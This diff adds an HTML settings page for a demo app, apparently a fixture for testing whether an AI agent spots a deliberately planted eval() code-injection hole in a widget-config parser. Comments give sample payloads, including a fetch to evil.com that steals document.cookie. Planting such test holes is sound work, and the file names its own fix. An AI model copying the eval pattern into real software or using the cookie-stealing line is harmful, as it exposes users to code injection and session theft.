@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Settings — NexusFlow</title>
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+
+  <div class="app">
+
+    <!-- ── Sidebar ──────────────────────────────── -->
+    <aside class="sidebar">
+      <a href="index.html" class="sidebar-logo">
+        <div class="logo-icon">N</div>
+        <span>NexusFlow</span>
+      </a>
+      <nav class="sidebar-nav">
+        <a href="index.html">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+          Dashboard
+        </a>
+        <a href="projects.html">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+          Projects
+        </a>
+        <a href="team.html">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4-4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
+          Team
+        </a>
+        <a href="invoices.html">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+          Invoices
+        </a>
+        <a href="settings.html" class="active">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg>
+          Settings
+        </a>
+      </nav>
+    </aside>
+
+    <!-- ── Main Content ─────────────────────────── -->
+    <main class="main">
+
+      <div class="page-header">
+        <h1>Settings</h1>
+        <p>Configure application settings and custom widgets. Paste JSON config and click "Apply" to trigger the vulnerability.</p>
+      </div>
+
+      <!-- General Settings (working, no bugs) -->
+      <div class="card">
+        <h2>General</h2>
+        <div class="field-row">
+          <div class="field">
+            <label>Application Name</label>
+            <input type="text" value="NexusFlow" disabled />
+          </div>
+          <div class="field">
+            <label>Environment</label>
+            <select disabled>
+              <option value="production" selected>Production</option>
+              <option value="staging">Staging</option>
+            </select>
+          </div>
+        </div>
+        <div class="field-row">
+          <div class="field">
+            <label>Timezone</label>
+            <select disabled>
+              <option value="utc">UTC</option>
+              <option value="est" selected>Eastern (EST)</option>
+              <option value="pst">Pacific (PST)</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>Date Format</label>
+            <select disabled>
+              <option value="mdy" selected>MM/DD/YYYY</option>
+              <option value="dmy">DD/MM/YYYY</option>
+              <option value="ymd">YYYY-MM-DD</option>
+            </select>
+          </div>
+        </div>
+      </div>
+
+      <!-- Notifications (working, no bugs) -->
+      <div class="card">
+        <h2>Notifications</h2>
+        <div class="field-row">
+          <div class="field">
+            <label>Email Notifications</label>
+            <select>
+              <option value="all">All Activity</option>
+              <option value="mentions" selected>Mentions Only</option>
+              <option value="none">Disabled</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>Slack Integration</label>
+            <select>
+              <option value="enabled" selected>Enabled</option>
+              <option value="disabled">Disabled</option>
+            </select>
+          </div>
+        </div>
+      </div>
+
+      <!-- ═══════════════════════════════════════════
+           VULNERABILITY: eval() injection
+           ═══════════════════════════════════════════
+           The "Custom Widget Config" feature uses
+           eval() to parse the user's JSON input instead
+           of JSON.parse(). This is an XSS / code
+           injection vulnerability.
+
+           Malformed JSON (e.g. just typing "hello")
+           will throw a SyntaxError via eval().
+           Malicious input like:
+             (function(){ alert('XSS') })()
+           would execute arbitrary JavaScript.
+
+           The agent should:
+           1. Identify eval() as the vulnerability
+           2. Recommend replacing with JSON.parse()
+           ═══════════════════════════════════════════ -->
+      <div class="card">
+        <h2>Custom Widget Config <span class="badge">Advanced</span></h2>
+        <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 16px;">
+          Paste a JSON configuration object to customize your dashboard widgets.
+          Try entering invalid JSON like <code style="background: var(--bg-primary); padding: 2px 6px; border-radius: 4px; font-family: var(--font-mono); font-size: 12px;">hello world</code> to trigger the bug.
+        </p>
+
+        <div class="field">
+          <label>Widget JSON Configuration</label>
+          <textarea id="widgetConfig" placeholder='e.g. { "layout": "grid", "columns": 3, "theme": "dark" }'></textarea>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="applyWidgetConfig()">Apply Configuration</button>
+          <button class="btn btn-secondary" onclick="resetConfigForm()">Reset</button>
+        </div>
+      </div>
+
+      <!-- Console Panel -->
+      <div class="console-panel">
+        <h3>Live Error Console</h3>
+        <pre id="consoleOutput"><span class="empty">Waiting for an error to be reported...</span></pre>
+      </div>
+
+    </main>
+  </div>
+
+
+  <!-- ── Scripts ──────────────────────────────────── -->
+  <script src="js/errorReporter.js"></script>
+  <script src="js/utils.js"></script>
+
+  <script>
+    /* ── Intercept console.log for the demo panel ── */
+    var _origLog = console.log;
+    console.log = function () {
+      _origLog.apply(console, arguments);
+      var msg = arguments[0];
+      if (typeof msg === "string" && msg.startsWith("{")) {
+        document.getElementById("consoleOutput").textContent = msg;
+      }
+    };
+
+
+    /**
+     * ═══════════════════════════════════════════════
+     *  parseWidgetConfig(input)
+     * ═══════════════════════════════════════════════
+     *  Parses a JSON configuration string from the
+     *  user's textarea input.
+     *
+     *  VULNERABILITY: Uses eval() instead of JSON.parse().
+     *
+     *  eval() executes arbitrary JavaScript code, which
+     *  means a malicious user could inject code like:
+     *    (function(){ fetch('https://evil.com/steal?cookie=' + document.cookie) })()
+     *
+     *  For demo purposes, entering any invalid JSON
+     *  (like "hello") will throw a SyntaxError through
+     *  eval(), which triggers the error reporter.
+     *
+     *  The fix: Replace eval('(' + input + ')') with
+     *           JSON.parse(input)
+     * ═══════════════════════════════════════════════
+     */
+    function parseWidgetConfig(input) {
+      // VULNERABILITY: Using eval() to parse user input
+      // This allows arbitrary code execution
+      var config = eval('(' + input + ')');
+      return config;
+    }
+
+
+    /**
+     * ═══════════════════════════════════════════════
+     *  applyWidgetConfig()
+     * ═══════════════════════════════════════════════
+     *  Reads the textarea, parses the config using
+     *  the vulnerable parseWidgetConfig(), and applies it.
+     * ═══════════════════════════════════════════════
+     */
+    function applyWidgetConfig() {
+      try {
+        var input = document.getElementById("widgetConfig").value;
+
+        if (!input.trim()) {
+          showToast("Please enter a configuration.", "error");
+          return;
+        }
+
+        // VULNERABLE: Uses eval() internally
+        var config = parseWidgetConfig(input);
+
+        // Validate the parsed config has expected structure
+        if (!config || typeof config !== "object") {
+          showToast("Invalid config: must be a JSON object.", "error");
+          return;
+        }
+
+        // This would apply the config if parsing succeeds:
+        var keys = Object.keys(config);
+        showToast("Widget config applied — " + keys.length + " setting(s) updated: " + keys.join(", "), "success");
+
+      } catch (e) {
+        ErrorReporter.report({
+          error: e,
+          source_file: "settings.html",
+          priority: "high",
+          title: "Widget config parsing failed — unsafe eval on user input",
+          context: {
+            module: "SettingsService",
+            action: "applyWidgetConfig",
+            inputs: {
+              rawInput: input,
+              inputLength: input ? input.length : 0
+            }
+          }
+        });
+        showToast("Error: " + e.message + " — reported to monitoring.", "error");
+      }
+    }
+
+
+    /* ── Reset form ────────────────────────────── */
+    function resetConfigForm() {
+      document.getElementById("widgetConfig").value = "";
+      document.getElementById("consoleOutput").innerHTML =
+        '<span class="empty">Waiting for an error to be reported...</span>';
+    }
+
+    /* ── Toast helper ──────────────────────────── */
+    function showToast(message, type) {
+      var existing = document.querySelector(".toast");
+      if (existing) existing.remove();
+      var toast = document.createElement("div");
+      toast.className = "toast " + type;
+      toast.textContent = message;
+      document.body.appendChild(toast);
+      toast.style.display = "block";
+      setTimeout(function () { toast.remove(); }, 5000);
+    }
+  </script>
+
+</body>
+</html>
